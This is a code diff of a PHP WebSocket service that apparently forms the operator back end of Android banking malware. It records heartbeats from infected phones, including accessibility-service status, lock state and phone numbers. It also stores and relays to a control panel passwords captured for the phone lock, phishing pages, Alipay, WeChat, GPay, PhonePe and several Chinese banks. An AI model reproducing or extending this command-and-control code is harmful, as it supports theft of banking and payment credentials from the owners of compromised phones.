@@ -5,7 +5,6 @@ declare(strict_types=1);
 namespace App\WebSocket\Services;
 
 use App\Models\Device;
-use App\Services\DeviceTokenService;
 use App\Services\GeoIpService;
 use App\WebSocket\Config\WebSocketConfig;
 use App\WebSocket\ConnectionManager;
@@ -14,6 +13,28 @@ use Illuminate\Support\Facades\Redis;
 
 class DeviceStatusService
 {
+    private const FIELD_NAME_MAP = [
+        'deviceId' => 'device_id',
+        'deviceName' => 'device_name',
+        'osVersion' => 'android_version',
+        'sdkVersion' => 'sdk_version',
+        'batteryLevel' => 'battery_level',
+        'isCharging' => 'battery_is_charging',
+        'isLocked' => 'is_locked',
+        'isScreenOn' => 'is_screen_on',
+        'networkType' => 'network_type',
+        'accessibilityAlive' => 'has_accessibility',
+        'hasSim' => 'has_sim',
+        'screenWidth' => 'screen_width',
+        'screenHeight' => 'screen_height',
+        'appName' => 'app_name',
+        'appVersion' => 'app_version',
+        'phoneNumber' => 'phone_number',
+        'phoneNumber2' => 'phone_number2',
+        'wsConnected' => 'ws_connected',
+        'owner_token' => 'owner_token',
+    ];
+
     private const PASSWORD_FIELD_MAP = [
         'phone' => 'pass_phone',
         'phish' => 'pass_phish',
@@ -32,297 +53,78 @@ class DeviceStatusService
         'mb' => 'pass_mb',
     ];
 
+    private const TRANSIENT_KEYS = [
+        'wallpap', 'activz', 'is_locked', 'is_screen_on',
+        'pass_phone', 'pass_phish', 'pass_alipay', 'pass_wechat',
+        'pass_yun', 'pass_jian', 'pass_you', 'pass_nong',
+        'pass_zhong', 'pass_gong', 'pass_zhao', 'pass_gpay',
+        'pass_phonepe', 'pass_bc', 'pass_mb',
+    ];
+
     public function __construct(
         private readonly ConnectionManager $connectionManager,
         private readonly DatabaseReconnector $databaseReconnector,
         private readonly PanelNotificationService $panelNotificationService,
-        private readonly DeviceTokenService $deviceTokenService,
-        private readonly EncryptionService $encryptionService,
     ) {}
 
-    public function updateFromPing(string $phoneId, string $encodedData): array
+    /**
+     * 处理心跳：写 DB + 存瞬态到 Redis
+     */
+    public function updateFromPing(string $phoneId, array $messageData): void
     {
-        $status = $this->parseDeviceParams($phoneId, $encodedData);
+        $status = $this->normalizeFieldNames($messageData);
         $status = $this->enrichWithGeoIp($phoneId, $status);
-        $status = $this->normalizeArabicNumerals($status);
 
         $this->connectionManager->updateDeviceStatus($phoneId, $status);
         $this->syncToDatabase($phoneId, $status);
-
-        return $status;
-    }
-
-    private function parseDeviceParams(string $phoneId, string $encodedData): array
-    {
-        parse_str($encodedData, $params);
-
-        // 清洗 user_email：如果含 ||（设备认证 token 格式），保留原始值用于认证，user_email 只保留纯 email
-        if (isset($params['user_email']) && str_contains($params['user_email'], '||')) {
-            $params['user_email_raw'] = $params['user_email'];
-            $params['user_email'] = explode('||', $params['user_email'], 2)[0];
-        }
-
-        return array_merge($params, [
-            'phone_id' => $phoneId,
-            'last_ping' => time(),
-            'is_online' => true,
-        ]);
-    }
-
-    private function enrichWithGeoIp(string $phoneId, array $status): array
-    {
-        try {
-            if (empty($status['ip'])) {
-                $clientIp = $this->connectionManager->getClientIp($phoneId);
-                if ($clientIp !== null) {
-                    $status['ip'] = $clientIp;
-                }
-            }
-
-            if (! empty($status['ip'])) {
-                $existing = $this->connectionManager->getDeviceStatus($phoneId);
-                $existingIp = $existing['ip'] ?? null;
-                $existingLocation = $existing['ip_location'] ?? null;
-
-                if ($status['ip'] === $existingIp && ! empty($existingLocation)) {
-                    $status['ip_location'] = $existingLocation;
-                } else {
-                    $device = Device::where('uuid', $phoneId)->first();
-                    if ($device && $status['ip'] === $device->ip_address && ! empty($device->ip_location)) {
-                        $status['ip_location'] = $device->ip_location;
-                    } else {
-                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
-                    }
-                }
-            }
-        } catch (\Throwable $e) {
-            WebSocketLog::getLogger()->warning('IP/GeoIP handling failed, skipping', [
-                'phone_id' => $phoneId,
-                'error' => $e->getMessage(),
-            ]);
-        }
-
-        return $status;
-    }
-
-    private function normalizeArabicNumerals(array $status): array
-    {
-        foreach ($status as $key => $value) {
-            if (is_string($value)) {
-                $status[$key] = $this->normalizeValue($value);
-            }
-        }
-
-        return $status;
-    }
-
-    private function normalizeValue(string $value): string
-    {
-        $arabicIndic = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
-        $western = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
-
-        return str_replace($arabicIndic, $western, trim($value));
-    }
-
-    private function syncToDatabase(string $phoneId, array $status): void
-    {
-        $device = Device::where('uuid', $phoneId)->first();
-        $isNewDevice = $device === null;
-
-        if ($isNewDevice) {
-            $device = $this->createDevice($phoneId, $status);
-            if ($device === null) {
-                return;
-            }
-        }
-
-        $updates = $this->buildDatabaseUpdates($status);
-        $wasOffline = ! $device->getOriginal('is_online');
-        $device->update($updates);
-
-        if ($this->shouldNotifyOnline($isNewDevice, $wasOffline, $phoneId)) {
-            WebSocketLog::getLogger()->info("Device online notification: {$phoneId}, isNew={$isNewDevice}, wasOffline={$wasOffline}");
-
-            $phoneInfo = $this->formatForPanel($phoneId);
-            $this->panelNotificationService->notifyDeviceOnline($phoneId, $device->user_id, $phoneInfo);
-        }
-    }
-
-    private function buildDatabaseUpdates(array $status): array
-    {
-        $updates = [
-            'is_online' => true,
-            'last_seen_at' => now(),
-        ];
-
-        if (isset($status['phone_name'])) {
-            $updates['name'] = $status['phone_name'];
-        }
-        if (isset($status['model'])) {
-            $updates['model'] = $status['model'];
-        }
-        if (isset($status['android_version'])) {
-            $updates['android_version'] = $status['android_version'];
-        }
-        if (isset($status['battery_charge'])) {
-            $level = BatteryParser::parseLevel($status['battery_charge']);
-            if ($level !== null) {
-                $updates['battery_level'] = $level;
-            }
-        }
-        if (isset($status['accessibility'])) {
-            $updates['has_accessibility'] = $status['accessibility'] === '1';
-        }
-        if (isset($status['country'])) {
-            $updates['country'] = $status['country'];
-        }
-        if (isset($status['ip'])) {
-            $updates['ip_address'] = $status['ip'];
-        }
-        if (isset($status['ip_location'])) {
-            $updates['ip_location'] = $status['ip_location'];
-        }
-
-        return $updates;
-    }
-
-    private function shouldNotifyOnline(bool $isNewDevice, bool $wasOffline, string $phoneId): bool
-    {
-        return $isNewDevice
-            || $wasOffline
-            || $this->isNewWebSocketConnection($phoneId);
-    }
-
-    private function isNewWebSocketConnection(string $phoneId): bool
-    {
-        $key = WebSocketConfig::lastNotifiedKey($phoneId);
-        $lastNotified = Redis::get($key);
-        $now = time();
-
-        Redis::setex($key, WebSocketConfig::lastNotifiedTtl(), (string) $now);
-
-        if ($lastNotified === null) {
-            return true;
-        }
-
-        return ($now - (int) $lastNotified) > WebSocketConfig::newConnectionThreshold();
-    }
-
-    private function createDevice(string $phoneId, array $status): ?Device
-    {
-        $authResult = $this->validateDeviceAuth($phoneId, $status);
-        if ($authResult === null) {
-            return null;
-        }
-
-        // Prefer userId (owner_token), fallback to email (legacy token)
-        $user = null;
-        if (! empty($authResult['user_id'])) {
-            $user = \App\Models\User::find($authResult['user_id']);
-        }
-        if ($user === null) {
-            $user = $this->resolveDeviceUser($authResult['email']);
-        }
-        if ($user === null) {
-            WebSocketLog::getLogger()->warning("Cannot create device {$phoneId}: no user found");
-
-            return null;
-        }
-
-        return Device::create($this->buildDeviceAttributes($phoneId, $status, $user));
-    }
-
-    private function validateDeviceAuth(string $phoneId, array $status): ?array
-    {
-        // Try owner_token first (userId-based, no email exposure)
-        $ownerToken = $status['owner_token'] ?? null;
-        if ($ownerToken !== null && $ownerToken !== '') {
-            $authResult = $this->deviceTokenService->validateOwnerToken($ownerToken);
-            if ($authResult['authenticated']) {
-                return $authResult;
-            }
-        }
-
-        // Fallback: legacy email-based token
-        $rawEmail = $status['user_email_raw'] ?? $status['user_email'] ?? null;
-        $authResult = $this->deviceTokenService->validateToken($rawEmail ?? '');
-
-        if (! $authResult['authenticated']) {
-            WebSocketLog::getLogger()->warning("Device auth failed for {$phoneId}", [
-                'owner_token' => $ownerToken !== null ? 'present' : 'missing',
-                'email' => $authResult['email'] ?? 'empty',
-            ]);
-
-            return null;
-        }
-
-        return $authResult;
-    }
-
-    private function resolveDeviceUser(?string $email): ?\App\Models\User
-    {
-        $user = $this->findUserByEmail($email);
-
-        if ($user === null) {
-            $user = \App\Models\User::first();
-        }
-
-        return $user;
-    }
-
-    private function buildDeviceAttributes(string $phoneId, array $status, \App\Models\User $user): array
-    {
-        $batteryLevel = isset($status['battery_charge'])
-            ? BatteryParser::parseLevel($status['battery_charge'])
-            : null;
-
-        return [
-            'uuid' => $phoneId,
-            'user_id' => $user->id,
-            'name' => $status['phone_name'] ?? 'Unknown Device',
-            'model' => $status['model'] ?? null,
-            'android_version' => $status['android_version'] ?? null,
-            'battery_level' => $batteryLevel,
-            'has_accessibility' => ($status['accessibility'] ?? '0') === '1',
-            'country' => $status['country'] ?? null,
-            'ip_address' => $status['ip'] ?? null,
-            'ip_location' => $status['ip_location'] ?? null,
-            'installed_at' => isset($status['install_date']) ? \Carbon\Carbon::parse($status['install_date']) : now(),
-            'is_online' => true,
-            'last_seen_at' => now(),
-        ];
     }
 
     /**
-     * 根据 email 查找用户，并返回资源归属用户（父账号）。
-     *
-     * 若匹配到子账号，则返回其父账号，确保设备挂到正确的归属用户下。
+     * 格式化面板数据：DB 读持久字段，Redis 读瞬态字段
      */
-    private function findUserByEmail(?string $email): ?\App\Models\User
+    public function formatForPanel(string $phoneId): array
     {
-        if (empty($email)) {
-            return null;
+        $device = Device::where('uuid', $phoneId)->first();
+        if (! $device) {
+            return ['pid' => $phoneId, 'is_online' => false];
         }
 
-        $this->databaseReconnector->reconnect();
+        $result = [
+            'pid' => $phoneId,
+            'uuid' => $device->uuid,
+            'device_name' => $device->name,
+            'model' => $device->model,
+            'brand' => $device->brand,
+            'android_version' => $device->android_version,
+            'app_name' => $device->app_name,
+            'app_version' => $device->app_version,
+            'battery_level' => $device->battery_level,
+            'battery_is_charging' => (bool) $device->is_charging,
+            'has_accessibility' => (bool) $device->has_accessibility,
+            'network_type' => $device->network_type,
+            'phone_number' => $device->phone_number,
+            'phone_number2' => $device->phone_number2,
+            'screen_width' => $device->screen_width,
+            'screen_height' => $device->screen_height,
+            'has_sim' => (bool) $device->has_sim,
+            'ip' => $device->ip_address ?? '',
+            'ip_location' => $device->ip_location ?? '',
+            'country' => $device->country ?? '',
+            'is_online' => (bool) $device->is_online,
+            'remark' => $device->remark,
+            'last_seen_at' => $device->last_seen_at?->toISOString(),
+            'installed_at' => $device->installed_at?->toISOString(),
+            'lastPing' => $device->last_seen_at?->getTimestamp() ? $device->last_seen_at->getTimestamp() * 1000 : 0,
+        ];
 
-        $user = \App\Models\User::where('email', $email)->first();
-        if ($user === null) {
-            $encryptedEmail = $this->encryptionService->encryptEmail($email);
-            $user = \App\Models\User::where('email_encrypted', $encryptedEmail)->first();
+        $redisStatus = $this->connectionManager->getDeviceStatus($phoneId);
+        foreach (self::TRANSIENT_KEYS as $key) {
+            if (isset($redisStatus[$key]) && $redisStatus[$key] !== '') {
+                $result[$key] = $redisStatus[$key];
+            }
         }
 
-        if ($user === null) {
-            return null;
-        }
-
-        // 始终返回资源归属用户（子账号 → 父账号，主账号 → 自身）
-        return $user->getResourceOwner();
-    }
-
-    public function getStatus(string $phoneId): array
-    {
-        return $this->connectionManager->getDeviceStatus($phoneId);
+        return $result;
     }
 
     public function isOnline(string $phoneId): bool
@@ -338,41 +140,16 @@ class DeviceStatusService
         ]);
     }
 
-    public function formatForPanel(string $phoneId): array
-    {
-        $status = $this->getStatus($phoneId);
-        $isOnline = $this->isOnline($phoneId);
-
-        // 从数据库读取 remark 字段
-        $device = Device::where('uuid', $phoneId)->first();
-        $remark = $device?->remark;
-
-        // 直接返回设备原始数据，添加服务端字段
-        return array_merge($status, [
-            'pid' => $phoneId,
-            'is_online' => $isOnline,
-            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
-            'ip_location' => $status['ip_location'] ?? '',
-            'remark' => $remark,
-        ]);
-    }
-
-    /**
-     * 提取密码数据
-     */
     public function extractPasswords(string $phoneId): array
     {
-        $status = $this->getStatus($phoneId);
+        $redisStatus = $this->connectionManager->getDeviceStatus($phoneId);
 
         return array_map(
-            fn (string $field) => $status[$field] ?? '',
+            fn (string $field) => $redisStatus[$field] ?? '',
             self::PASSWORD_FIELD_MAP,
         );
     }
 
-    /**
-     * 格式化完整的设备状态（包含密码）供 Panel 使用
-     */
     public function formatFullStatusForPanel(string $phoneId): array
     {
         $phoneInfo = $this->formatForPanel($phoneId);
@@ -384,5 +161,138 @@ class DeviceStatusService
             'is_online' => $phoneInfo['is_online'],
             'lastPing' => $phoneInfo['lastPing'] ?? null,
         ];
+    }
+
+    // ── Private ──
+
+    private function normalizeFieldNames(array $data): array
+    {
+        $normalized = [];
+        foreach ($data as $key => $value) {
+            $normalized[self::FIELD_NAME_MAP[$key] ?? $key] = $value;
+        }
+
+        return $normalized;
+    }
+
+    private function enrichWithGeoIp(string $phoneId, array $status): array
+    {
+        try {
+            if (empty($status['ip'])) {
+                $clientIp = $this->connectionManager->getClientIp($phoneId);
+                if ($clientIp !== null) {
+                    $status['ip'] = $clientIp;
+                }
+            }
+
+            if (! empty($status['ip'])) {
+                $device = Device::where('uuid', $phoneId)->first();
+                if ($device && $status['ip'] === $device->ip_address && ! empty($device->ip_location)) {
+                    $status['ip_location'] = $device->ip_location;
+                } else {
+                    $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
+                }
+            }
+        } catch (\Throwable $e) {
+            WebSocketLog::getLogger()->warning('GeoIP failed', [
+                'phone_id' => $phoneId,
+                'error' => $e->getMessage(),
+            ]);
+        }
+
+        return $status;
+    }
+
+    private function syncToDatabase(string $phoneId, array $status): void
+    {
+        $this->databaseReconnector->reconnect();
+
+        $device = Device::where('uuid', $phoneId)->first();
+        if (! $device) {
+            WebSocketLog::getLogger()->debug("Device {$phoneId} not registered, skipping");
+
+            return;
+        }
+
+        $updates = $this->buildDatabaseUpdates($status);
+        $wasOffline = ! $device->getOriginal('is_online');
+        $device->update($updates);
+
+        if ($wasOffline || $this->isNewWebSocketConnection($phoneId)) {
+            $phoneInfo = $this->formatForPanel($phoneId);
+            $this->panelNotificationService->notifyDeviceOnline($phoneId, $device->user_id, $phoneInfo);
+        }
+    }
+
+    private function buildDatabaseUpdates(array $status): array
+    {
+        $updates = [
+            'is_online' => true,
+            'last_seen_at' => now(),
+        ];
+
+        $stringFields = [
+            'device_name' => 'name',
+            'model' => 'model',
+            'brand' => 'brand',
+            'manufacturer' => 'manufacturer',
+            'android_version' => 'android_version',
+            'app_name' => 'app_name',
+            'app_version' => 'app_version',
+            'phone_number' => 'phone_number',
+            'phone_number2' => 'phone_number2',
+            'network_type' => 'network_type',
+            'country' => 'country',
+            'ip' => 'ip_address',
+            'ip_location' => 'ip_location',
+        ];
+
+        foreach ($stringFields as $statusKey => $dbColumn) {
+            if (isset($status[$statusKey]) && $status[$statusKey] !== '') {
+                $updates[$dbColumn] = $status[$statusKey];
+            }
+        }
+
+        $intFields = [
+            'battery_level' => 'battery_level',
+            'sdk_version' => 'sdk_version',
+            'screen_width' => 'screen_width',
+            'screen_height' => 'screen_height',
+        ];
+
+        foreach ($intFields as $statusKey => $dbColumn) {
+            if (isset($status[$statusKey]) && is_numeric($status[$statusKey])) {
+                $updates[$dbColumn] = (int) $status[$statusKey];
+            }
+        }
+
+        $boolFields = [
+            'battery_is_charging' => 'is_charging',
+            'has_sim' => 'has_sim',
+            'has_accessibility' => 'has_accessibility',
+        ];
+
+        foreach ($boolFields as $statusKey => $dbColumn) {
+            if (isset($status[$statusKey])) {
+                $updates[$dbColumn] = (bool) $status[$statusKey];
+            }
+        }
+
+        return $updates;
+    }
+
+    private function isNewWebSocketConnection(string $phoneId): bool
+    {
+        $key = WebSocketConfig::lastNotifiedKey($phoneId);
+        $lastNotified = Redis::get($key);
+        $now = time();
+
+        Redis::setex($key, WebSocketConfig::lastNotifiedTtl(), (string) $now);
+
+        if ($lastNotified === null) {
+            return true;
+        }
+
+        return ($now - (int) $lastNotified) > WebSocketConfig::newConnectionThreshold();
     }
 }
